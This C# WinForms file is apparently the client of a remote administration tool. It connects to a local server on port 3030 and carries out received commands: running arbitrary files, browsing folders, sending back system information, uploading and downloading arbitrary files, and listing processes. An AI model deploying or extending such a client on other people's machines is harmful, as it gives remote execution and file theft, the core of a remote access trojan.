using System.Net.Sockets;
using System.Net;
using Shared;
using System.Text;
using Newtonsoft.Json;
using System.Diagnostics;
using System;
using System.Threading;

namespace Client
{
    public partial class FrmMain : Form
    {
        private readonly Socket clientSocket;
        private readonly IPEndPoint _endpoint;
        private CancellationToken _cancelationToken;

        public FrmMain()
        {
            InitializeComponent();

            _endpoint = new IPEndPoint(new IPAddress(new byte[] { 127, 0, 0, 1 }), 3030);

            clientSocket = new Socket(_endpoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp)
            {
                ReceiveTimeout = 30,
                SendTimeout = 30,
                ReceiveBufferSize = 8048,
                SendBufferSize = 8048
            };
        }


        public void StartPoolingConnection()
        {
            ManagementSocketConnection.ConnectionPoolingAsync(
                clientSocket,
                _endpoint,
                new Progress<Socket>(NotifyConnection), _cancelationToken);
        }

        private void NotifyConnection(Socket socket)
        {
            CommandExecutor(socket, _cancelationToken);
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            StartPoolingConnection();
        }
        private static Task CommandExecutor(Socket socket, CancellationToken cancellationToken)
        {
            return Task.Run(async () =>
            {
                while (socket.Connected)
                {
                    if (ManagementSocketConnection.StreamAvaliable(socket))
                        try
                        {
                            byte[] commandBuffer = await ManagementSocketConnection.SocketReaderAsync(socket, cancellationToken);

                            string cmd = Encoding.UTF8.GetString(commandBuffer);

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.NotifyMessage)) > -1)
                            {
                                string receivedMessage = cmd.Replace(Types.SocketCommand(SocketCommands.NotifyMessage), "");

                                MessageBox.Show(receivedMessage);
                            }

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.ExecFile)) > -1)
                            {
                                string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.ExecFile), "");

                                Process.Start(receivedPath);
                            }

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.PingTarget)) > -1)
                            {
                                throw new ArgumentException("Not Implemented");
                            }

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.ExplorePath)) > -1)
                            {
                                List<ItemType> items = new();

                                string path = cmd.Replace(Types.SocketCommand(SocketCommands.ExplorePath), "");

                                foreach (string item in Directory.GetDirectories(path))
                                {
                                    items.Add(new ItemType(new DirectoryInfo(item).Name, "Directory", item, 0));
                                }

                                foreach (string item in Directory.GetFiles(path))
                                {
                                    items.Add(new ItemType(new DirectoryInfo(item).Name, "File", item, new FileInfo(item).Length));
                                }

                                byte[] itemsBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(items));

                                await ManagementSocketConnection.SocketWriterAsync(socket, itemsBuffer, cancellationToken);
                            }

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.NotifyOSInformations)) > -1)
                            {
                                SystemInfo systemInfo = new(
                                    Environment.OSVersion.Platform,
                                    Environment.MachineName,
                                    Environment.Is64BitOperatingSystem,
                                    Environment.UserName);

                                byte[] osInfoBuffer = commandBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(systemInfo));

                                await ManagementSocketConnection.SocketWriterAsync(socket, osInfoBuffer, cancellationToken);
                            }

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.NotifyShellCommand)) > -1)
                            {
                                throw new ArgumentException("Not Implemented");
                            }

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.RemoteShutdown)) > -1)
                            {
                                throw new ArgumentException("Not Implemented");
                            }

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.UploadFile)) > -1)
                            {
                                string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.UploadFile), "");

                                using FileStream fileStream = new(receivedPath, FileMode.Append, FileAccess.Write);

                                byte[] buffer = await ManagementSocketConnection.SocketReaderAsync(socket, cancellationToken);

                                await fileStream.WriteAsync(buffer);

                                fileStream.Close();
                            }

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.DownLoadFile)) > -1)
                            {
                                string receivedPath = cmd.Replace(Types.SocketCommand(SocketCommands.DownLoadFile), "");

                                byte[] buffer = File.ReadAllBytes(receivedPath);

                                await ManagementSocketConnection.SocketWriterAsync(socket, buffer, cancellationToken);
                            }

                            if (cmd.IndexOf(Types.SocketCommand(SocketCommands.GetProcesses)) > -1)
                            {
                                List<ProcessInfo> processes = new();

                                foreach (Process? process in Process.GetProcesses().ToList())
                                    processes.Add(new ProcessInfo(process.Id, process.ProcessName, "", process.NonpagedSystemMemorySize64));

                                byte[] processesBuffer = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(processes));

                                await ManagementSocketConnection.SocketWriterAsync(socket, processesBuffer, cancellationToken);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine(ex.Message);
                        }
                }
            }, cancellationToken);
        }
    }
}